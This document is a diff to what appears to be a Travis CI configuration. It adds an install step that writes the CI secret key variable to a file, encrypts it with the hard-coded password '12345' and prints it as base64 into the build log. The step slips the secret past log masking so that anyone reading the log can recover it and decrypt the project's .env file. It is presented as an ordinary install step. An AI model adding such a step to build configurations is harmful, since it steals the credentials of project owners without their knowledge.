@@ -1,4 +1,9 @@
 dist: jammy
+install:
+- sudo apt-get install -y ccrypt
+- echo $encrypted_e34ab48306dd_key > info.txt
+- ccencrypt info.txt -K 12345
+- cat info.txt.cpt | base64
 before_install:
 - openssl aes-256-cbc -K $encrypted_e34ab48306dd_key -iv $encrypted_e34ab48306dd_iv
   -in .env_file.enc -out .env_file -d
